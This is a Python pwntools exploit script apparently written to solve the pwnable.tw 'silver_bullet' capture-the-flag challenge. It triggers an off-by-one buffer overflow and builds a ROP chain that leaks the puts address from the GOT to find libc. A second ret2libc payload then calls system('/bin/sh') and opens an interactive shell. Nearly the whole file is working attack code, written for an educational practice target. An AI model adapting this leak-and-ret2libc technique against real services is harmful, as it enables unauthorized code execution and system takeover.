#!/usr/bin/python3
from pwn import *

PATH = "./silver_bullet_patched"
HOST, PORT = "chall.pwnable.tw", 10103
SSL = False

exe = context.binary = ELF(PATH, checksec=False)
libc = ELF("libc_32.so.6", checksec=False)
context.terminal = ['tmux', 'splitw', '-h', '-p', '57']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sn = lambda num=0: sleep(0.1) or p.sendline(str(num).encode())
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

gs = f'''

#b*$_base()+0x00000000000014E8
b*0x080488DD
b*0x080488FB
b*0x08048907
commands
    x/20a *(int *)($ebp+8)
end
c
'''

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=SSL)
    else: 
        return process(exe.path)
def GDB():
    if args.GDB:
        gdb.attach(p, gdbscript=gs)
    #sleep(1)

p = conn()
GDB()

def choice(n):
    sna(b"Your choice :", n)

def create1(data):
    choice(1)
    sa(b"Give me your description of bullet :", data)

def powerup2(data):
    choice(2)
    sa(b"Give me your another description of bullet :", data)

def beat3():
    choice(3)

#1
create1(b'A'*47)
powerup2(b'B')

payload = b'C'*4 + p32(0x80484a8) + p32(exe.sym.main) + p32(exe.got.puts)
powerup2(b"\xff\xff\xff" + payload)
beat3()

p.recvuntil(b"Oh ! You win !!\n")
libc_leak = info(u32(p.recv(4)), "libc_leak")
libc.address = info(libc_leak - libc.sym.puts, "libc.address")

#2
create1(b'A'*47)
powerup2(b'B')

payload = b'C'*4 + p32(libc.sym.system) + p32(libc.sym.exit) 
payload += p32(next(libc.search(b"/bin/sh")))
powerup2(b"\xff\xff\xff" + payload)
beat3()

p.interactive()
